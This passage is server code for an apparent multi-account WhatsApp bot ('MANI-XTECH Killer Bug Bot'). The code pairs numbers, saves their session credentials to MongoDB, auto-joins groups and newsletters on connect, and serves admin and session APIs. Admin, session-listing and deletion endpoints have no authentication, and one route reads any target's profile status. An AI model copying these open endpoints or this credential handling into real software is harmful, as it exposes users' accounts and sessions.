        const credsObj = JSON.parse(fileContent);
        const keysObj = state.keys || null;
        await saveCredsToMongo(sanitizedNumber, credsObj, keysObj);
      } catch (err) { console.error('Failed saving creds on creds.update:', err); }
    });


    socket.ev.on('connection.update', async (update) => {
      const { connection } = update;
      if (connection === 'open') {
        try {
          await delay(3000);
          const userJid = jidNormalizedUser(socket.user.id);
          const groupResult = await joinGroup(socket).catch(()=>({ status: 'failed', error: 'joinGroup not configured' }));

          // try follow newsletters if configured
          try {
            const newsletterListDocs = await listNewslettersFromMongo();
            for (const doc of newsletterListDocs) {
              const jid = doc.jid;
              try { if (typeof socket.newsletterFollow === 'function') await socket.newsletterFollow(jid); } catch(e){}
            }
          } catch(e){}

          activeSockets.set(sanitizedNumber, socket);
          const groupStatus = groupResult.status === 'success' ? 'Joined successfully' : `Failed to join group: ${groupResult.error}`;

          // Load per-session config (botName, logo)
          const userConfig = await loadUserConfigFromMongo(sanitizedNumber) || {};
          const useBotName = userConfig.botName || BOT_NAME_FANCY;
          const useLogo = userConfig.logo || config.RCD_IMAGE_PATH;

          const initialCaption = formatMessage(useBotName,
            `✅\n\n✅ Successfully connected!\n\n🔢 Number: ${sanitizedNumber}\n🕒 Connecting: Bot will become active in a few seconds`,
            useBotName
          );

          // send initial message
          let sentMsg = null;
          try {
            if (String(useLogo).startsWith('http')) {
              sentMsg = await socket.sendMessage(userJid, { image: { url: useLogo }, caption: initialCaption });
            } else {
              try {
                const buf = fs.readFileSync(useLogo);
                sentMsg = await socket.sendMessage(userJid, { image: buf, caption: initialCaption });
              } catch (e) {
                sentMsg = await socket.sendMessage(userJid, { image: { url: config.RCD_IMAGE_PATH }, caption: initialCaption });
              }
            }
          } catch (e) {
            console.warn('Failed to send initial connect message (image). Falling back to text.', e?.message || e);
            try { sentMsg = await socket.sendMessage(userJid, { text: initialCaption }); } catch(e){}
          }

          await delay(4000);

          const updatedCaption = formatMessage(
  useBotName,
  `╭━━━〔 🩵 𝗠𝗔𝗡𝗜- 𝗞𝗜𝗟𝗟𝗘𝗥 🩵 〕━━━╮
┃ ✅ Connection Successful
┃ 🚀 Bot Status : ACTIVE
╰━━━━━━━━━━━━━━━━━━━━╯

╭━━〔 📱 DEVICE INFO 〕━━╮
┃ 🔢 Number : ${sanitizedNumber}
┃ 🕒 Connected : ${getSriLankaTimestamp()}
╰━━━━━━━━━━━━━━━━━━━━╯

⚡ Session Established Successfully
🟢 System Online & Ready
👑 Welcome To MANI-XTECH Killer Bug Bot`,
  useBotName
);

          try {
            if (sentMsg && sentMsg.key) {
              try {
                await socket.sendMessage(userJid, { delete: sentMsg.key });
              } catch (delErr) {
                console.warn('Could not delete original connect message (not fatal):', delErr?.message || delErr);
              }
            }

            try {
              if (String(useLogo).startsWith('http')) {
                await socket.sendMessage(userJid, { image: { url: useLogo }, caption: updatedCaption });
              } else {
                try {
                  const buf = fs.readFileSync(useLogo);
                  await socket.sendMessage(userJid, { image: buf, caption: updatedCaption });
                } catch (e) {
                  await socket.sendMessage(userJid, { text: updatedCaption });
                }
              }
            } catch (imgErr) {
              await socket.sendMessage(userJid, { text: updatedCaption });
            }
          } catch (e) {
            console.error('Failed during connect-message edit sequence:', e);
          }

          // send admin + owner notifications as before, with session overrides
          await sendAdminConnectMessage(socket, sanitizedNumber, groupResult, userConfig);
          // await sendOwnerConnectMessage(socket, sanitizedNumber, groupResult, userConfig); // DISABLED
          await addNumberToMongo(sanitizedNumber);

        } catch (e) { 
          console.error('Connection open error:', e); 
          try { exec(`pm2.restart ${process.env.PM2_NAME || 'MANI-MINI-main'}`); } catch(e) { console.error('pm2 restart failed', e); }
        }
      }
      if (connection === 'close') {
        try { if (fs.existsSync(sessionPath)) fs.removeSync(sessionPath); } catch(e){}
      }

    });


    activeSockets.set(sanitizedNumber, socket);

  } catch (error) {
    console.error('Pairing error:', error);
    socketCreationTime.delete(sanitizedNumber);
    if (!res.headersSent) res.status(503).send({ error: 'Service Unavailable' });
  }

}


// ---------------- endpoints (admin/newsletter management + others) ----------------

router.post('/newsletter/add', async (req, res) => {
  const { jid, emojis } = req.body;
  if (!jid) return res.status(400).send({ error: 'jid required' });
  if (!jid.endsWith('@newsletter')) return res.status(400).send({ error: 'Invalid newsletter jid' });
  try {
    await addNewsletterToMongo(jid, Array.isArray(emojis) ? emojis : []);
    res.status(200).send({ status: 'ok', jid });
  } catch (e) { res.status(500).send({ error: e.message || e }); }
});


router.post('/newsletter/remove', async (req, res) => {
  const { jid } = req.body;
  if (!jid) return res.status(400).send({ error: 'jid required' });
  try {
    await removeNewsletterFromMongo(jid);
    res.status(200).send({ status: 'ok', jid });
  } catch (e) { res.status(500).send({ error: e.message || e }); }
});


router.get('/newsletter/list', async (req, res) => {
  try {
    const list = await listNewslettersFromMongo();
    res.status(200).send({ status: 'ok', channels: list });
  } catch (e) { res.status(500).send({ error: e.message || e }); }
});


// admin endpoints

router.post('/admin/add', async (req, res) => {
  const { jid } = req.body;
  if (!jid) return res.status(400).send({ error: 'jid required' });
  try {
    await addAdminToMongo(jid);
    res.status(200).send({ status: 'ok', jid });
  } catch (e) { res.status(500).send({ error: e.message || e }); }
});


router.post('/admin/remove', async (req, res) => {
  const { jid } = req.body;
  if (!jid) return res.status(400).send({ error: 'jid required' });
  try {
    await removeAdminFromMongo(jid);
    res.status(200).send({ status: 'ok', jid });
  } catch (e) { res.status(500).send({ error: e.message || e }); }
});


router.get('/admin/list', async (req, res) => {
  try {
    const list = await loadAdminsFromMongo();
    res.status(200).send({ status: 'ok', admins: list });
  } catch (e) { res.status(500).send({ error: e.message || e }); }
});


// existing endpoints (connect, reconnect, active, etc.)

router.get('/', async (req, res) => {
  const { number } = req.query;
  if (!number) return res.status(400).send({ error: 'Number parameter is required' });
  if (activeSockets.has(number.replace(/[^0-9]/g, ''))) return res.status(200).send({ status: 'already_connected', message: 'This number is already connected' });
  await EmpirePair(number, res);
});

router.get('/code', async (req, res) => {
  const { number } = req.query;
  if (!number) return res.status(400).send({ error: 'Number parameter is required' });
  if (activeSockets.has(number.replace(/[^0-9]/g, ''))) return res.status(200).send({ status: 'already_connected', message: 'This number is already connected' });
  await EmpirePair(number, res);
});


router.get('/active', (req, res) => {
  res.status(200).send({ botName: BOT_NAME_FANCY, count: activeSockets.size, numbers: Array.from(activeSockets.keys()), timestamp: getSriLankaTimestamp() });
});


router.get('/ping', (req, res) => {
  res.status(200).send({ status: 'active', botName: BOT_NAME_FANCY, message: '🇳🇵MANI  FREE BOT', activesession: activeSockets.size });
});


router.get('/connect-all', async (req, res) => {
  try {
    const numbers = await getAllNumbersFromMongo();
    if (!numbers || numbers.length === 0) return res.status(404).send({ error: 'No numbers found to connect' });
    const results = [];
    for (const number of numbers) {
      if (activeSockets.has(number)) { results.push({ number, status: 'already_connected' }); continue; }
      const mockRes = { headersSent: false, send: () => {}, status: () => mockRes };
      await EmpirePair(number, mockRes);
      results.push({ number, status: 'connection_initiated' });
    }
    res.status(200).send({ status: 'success', connections: results });
  } catch (error) { console.error('Connect all error:', error); res.status(500).send({ error: 'Failed to connect all bots' }); }
});


router.get('/reconnect', async (req, res) => {
  try {
    const numbers = await getAllNumbersFromMongo();
    if (!numbers || numbers.length === 0) return res.status(404).send({ error: 'No session numbers found in MongoDB' });
    const results = [];
    for (const number of numbers) {
      if (activeSockets.has(number)) { results.push({ number, status: 'already_connected' }); continue; }
      const mockRes = { headersSent: false, send: () => {}, status: () => mockRes };
      try { await EmpirePair(number, mockRes); results.push({ number, status: 'connection_initiated' }); } catch (err) { results.push({ number, status: 'failed', error: err.message }); }
      await delay(1000);
    }
    res.status(200).send({ status: 'success', connections: results });
  } catch (error) { console.error('Reconnect error:', error); res.status(500).send({ error: 'Failed to reconnect bots' }); }
});

router.get('/update-config', async (req, res) => {
  const { number, config: configString } = req.query;
  if (!number || !configString) return res.status(400).send({ error: 'Number and config are required' });
  let newConfig;
  try { newConfig = JSON.parse(configString); } catch (error) { return res.status(400).send({ error: 'Invalid config format' }); }
  const sanitizedNumber = number.replace(/[^0-9]/g, '');
  const socket = activeSockets.get(sanitizedNumber);
  if (!socket) return res.status(404).send({ error: 'No active session found for this number' });
  const otp = generateOTP();
  otpStore.set(sanitizedNumber, { otp, expiry: Date.now() + config.OTP_EXPIRY, newConfig });
  try { await sendOTP(socket, sanitizedNumber, otp); res.status(200).send({ status: 'otp_sent', message: 'OTP sent to your number' }); }
  catch (error) { otpStore.delete(sanitizedNumber); res.status(500).send({ error: 'Failed to send OTP' }); }
});


router.get('/verify-otp', async (req, res) => {
  const { number, otp } = req.query;
  if (!number || !otp) return res.status(400).send({ error: 'Number and OTP are required' });
  const sanitizedNumber = number.replace(/[^0-9]/g, '');
  const storedData = otpStore.get(sanitizedNumber);
  if (!storedData) return res.status(400).send({ error: 'No OTP request found for this number' });
  if (Date.now() >= storedData.expiry) { otpStore.delete(sanitizedNumber); return res.status(400).send({ error: 'OTP has expired' }); }
  if (storedData.otp !== otp) return res.status(400).send({ error: 'Invalid OTP' });
  try {
    await setUserConfigInMongo(sanitizedNumber, storedData.newConfig);
    otpStore.delete(sanitizedNumber);
    const sock = activeSockets.get(sanitizedNumber);
    if (sock) await sock.sendMessage(jidNormalizedUser(sock.user.id), { image: { url: config.RCD_IMAGE_PATH }, caption: formatMessage('📌 CONFIG UPDATED', 'Your configuration has been successfully updated!', BOT_NAME_FANCY) });
    res.status(200).send({ status: 'success', message: 'Config updated successfully' });
  } catch (error) { console.error('Failed to update config:', error); res.status(500).send({ error: 'Failed to update config' }); }
});

router.get('/getabout', async (req, res) => {
  const { number, target } = req.query;
  if (!number || !target) return res.status(400).send({ error: 'Number and target number are required' });
  const sanitizedNumber = number.replace(/[^0-9]/g, '');
  const socket = activeSockets.get(sanitizedNumber);
  if (!socket) return res.status(404).send({ error: 'No active session found for this number' });
  const targetJid = `${target.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
  try {
    const statusData = await socket.fetchStatus(targetJid);
    const aboutStatus = statusData.status || 'No status available';
    const setAt = statusData.setAt ? moment(statusData.setAt).tz('Asia/Colombo').format('YYYY-MM-DD HH:mm:ss') : 'Unknown';
    res.status(200).send({ status: 'success', number: target, about: aboutStatus, setAt: setAt });
  } catch (error) { console.error(`Failed to fetch status for ${target}:`, error); res.status(500).send({ status: 'error', message: `Failed to fetch About status for ${target}.` }); }
});


// ---------------- Dashboard endpoints & static ----------------

const dashboardStaticDir = path.join(__dirname, 'dashboard_static');
if (!fs.existsSync(dashboardStaticDir)) fs.ensureDirSync(dashboardStaticDir);
router.use('/dashboard/static', express.static(dashboardStaticDir));
router.get('/dashboard', async (req, res) => {
  res.sendFile(path.join(dashboardStaticDir, 'index.html'));
});


// API: sessions & active & delete

router.get('/api/sessions', async (req, res) => {
  try {
    await initMongo();
    const docs = await sessionsCol.find({}, { projection: { number: 1, updatedAt: 1 } }).sort({ updatedAt: -1 }).toArray();
    res.json({ ok: true, sessions: docs });
  } catch (err) {
    console.error('API /api/sessions error', err);
    res.status(500).json({ ok: false, error: err.message || err });
  }
});


router.get('/api/active', async (req, res) => {
  try {
    const keys = Array.from(activeSockets.keys());
    res.json({ ok: true, active: keys, count: keys.length });
  } catch (err) {
    res.status(500).json({ ok: false, error: err.message || err });
  }
});


router.post('/api/session/delete', async (req, res) => {
  try {
    const { number } = req.body;
    if (!number) return res.status(400).json({ ok: false, error: 'number required' });
    const sanitized = ('' + number).replace(/[^0-9]/g, '');
    const running = activeSockets.get(sanitized);
    if (running) {
      try { if (typeof running.logout === 'function') await running.logout().catch(()=>{}); } catch(e){}
      try { running.ws?.close(); } catch(e){}
      activeSockets.delete(sanitized);
      socketCreationTime.delete(sanitized);
    }
    await removeSessionFromMongo(sanitized);
    await removeNumberFromMongo(sanitized);
    try { const sessTmp = path.join(os.tmpdir(), `session_${sanitized}`); if (fs.existsSync(sessTmp)) fs.removeSync(sessTmp); } catch(e){}
    res.json({ ok: true, message: `Session ${sanitized} removed` });
  } catch (err) {
    console.error('API /api/session/delete error', err);
    res.status(500).json({ ok: false, error: err.message || err });
  }
});

router.get('/api/newsletters', async (req, res) => {
  try {
    const list = await listNewslettersFromMongo();
    res.json({ ok: true, list });
  } catch (err) { res.status(500).json({ ok: false, error: err.message || err }); }
});
router.get('/api/admins', async (req, res) => {
  try {
    const list = await loadAdminsFromMongo();
    res.json({ ok: true, list });
  } catch (err) { res.status(500).json({ ok: false, error: err.message || err }); }
});


// ---------------- cleanup + process events ----------------

process.on('exit', () => {
  activeSockets.forEach((socket, number) => {
    try { socket.ws.close(); } catch (e) {}
    activeSockets.delete(number);
    socketCreationTime.delete(number);
    try { fs.removeSync(path.join(os.tmpdir(), `session_${number}`)); } catch(e){}
  });
});


process.on('uncaughtException', (err) => {
  console.error('Uncaught exception:', err);
  try { exec(`pm2.restart ${process.env.PM2_NAME || 'MANI-MINI-main'}`); } catch(e) { console.error('Failed to restart pm2:', e); }
});


// initialize mongo & auto-reconnect attempt

initMongo().catch(err => console.warn('Mongo init failed at startup', err));
(async()=>{ try { const nums = await getAllNumbersFromMongo(); if (nums && nums.length) { for (const n of nums) { if (!activeSockets.has(n)) { const mockRes = { headersSent:false, send:()=>{}, status:()=>mockRes }; await EmpirePair(n, mockRes); await delay(500); } } } } catch(e){} })();


module.exports = router;
